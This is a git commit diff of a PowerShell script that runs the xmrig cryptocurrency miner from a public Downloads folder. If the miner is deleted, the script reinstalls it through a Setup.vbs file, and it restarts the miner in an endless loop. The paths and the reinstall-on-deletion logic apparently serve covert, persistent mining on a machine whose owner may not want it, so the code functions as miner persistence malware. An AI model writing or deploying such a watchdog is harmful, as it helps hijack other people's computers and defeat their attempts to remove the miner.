eba353ecf040cd7483d7a95231a8ec96332e145a
GALVINVN <112307302+GALVINVN@users.noreply.github.com>
2025-06-09 07:02:11 +0700

    ring.ps1

--- ring.ps1
+++ ring.ps1
@@ -2,25 +2,15 @@ $xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 
-function Is-XmrigRunning {
-    return (Get-Process | Where-Object { $_.Path -eq $xmrigPath }) -ne $null
-}
-
 function Start-CoinRun {
-    if (Is-XmrigRunning) {
-        Write-Host "xmrig.exe Running. STOP"
-        return
-    }
-
     $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
-    Write-Host "Running coinrun.cmd"
+    Write-Host "coinrun.cmd START"
 }
-
 
 if (Test-Path $xmrigPath) {
     Start-CoinRun
 } else {
-    Write-Warning "xmrig.exe NOT. RUN Setup.vbs..."
+    Write-Warning "xmrig.exe DoseNotExist..."
     if (Test-Path $setupPath) {
         Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
         Write-Host "Running Setup.vbs"
@@ -30,39 +20,37 @@ if (Test-Path $xmrigPath) {
             Start-Sleep -Seconds 3
         }
 
+        Write-Host "xmrig.exe. RUN coinrun.cmd"
         Start-CoinRun
     } else {
-        Write-Error "NOT Setup.vbs"
+        Write-Error "NO Setup.vbs"
     }
 }
 
-
 while ($true) {
     if (!(Test-Path $xmrigPath)) {
-        Write-Warning "xmrig.exe DEL. Run Setup.vbs..."
+        Write-Warning "xmrig.exe Del. Wait..."
 
         if (Test-Path $setupPath) {
             Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
-            Write-Host "RUN Setup.vbs"
+            Write-Host "Run Setup.vbs!"
 
             while (!(Test-Path $xmrigPath)) {
-                Write-Host "Wait xmrig.exe..."
+                Write-Host "Wait.. xmrig.exe"
                 Start-Sleep -Seconds 3
             }
 
+            Write-Host "START coinrun.cmd"
             Start-CoinRun
         } else {
-            Write-Error "NOT Setup.vbs $setupPath"
+            Write-Error "NO Setup.vbs: $setupPath"
         }
     }
-
-
     if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
-        Write-Warning "coinrun.cmd STOPPED. Checking xmrig status..."
+        Write-Warning "coinrun.cmd STOP. Reboot..."
         Start-CoinRun
     } elseif ($global:coinRunProcess) {
         Write-Host "coinrun.cmd running..."
     }
-
     Start-Sleep -Seconds 3
 }
